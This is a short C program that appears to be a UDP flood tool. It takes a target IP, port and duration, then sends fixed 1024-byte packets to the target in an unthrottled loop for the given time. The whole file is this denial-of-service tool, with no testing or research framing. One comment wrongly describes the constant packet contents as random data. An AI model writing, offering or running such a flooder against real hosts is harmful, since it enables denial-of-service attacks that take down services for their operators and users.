#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PACKET_SIZE 1024 // Size of UDP packet

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (port <= 0 || port > 65535 || duration <= 0) {
        fprintf(stderr, "Invalid port or time.\n");
        return 1;
    }

    int sockfd;
    struct sockaddr_in server_addr;
    char packet[PACKET_SIZE];

    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    // Convert IP address
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sockfd);
        return 1;
    }

    // Fill packet with random data
    memset(packet, 'A', PACKET_SIZE);

    printf("Sending UDP packets to %s:%d for %d seconds...\n", ip, port, duration);

    time_t start_time = time(NULL);

    // Send packets for the specified duration
    while (time(NULL) - start_time < duration) {
        if (sendto(sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Failed to send packet");
            close(sockfd);
            return 1;
        }
    }

    printf("Finished sending packets.\n");

    close(sockfd);
    return 0;
}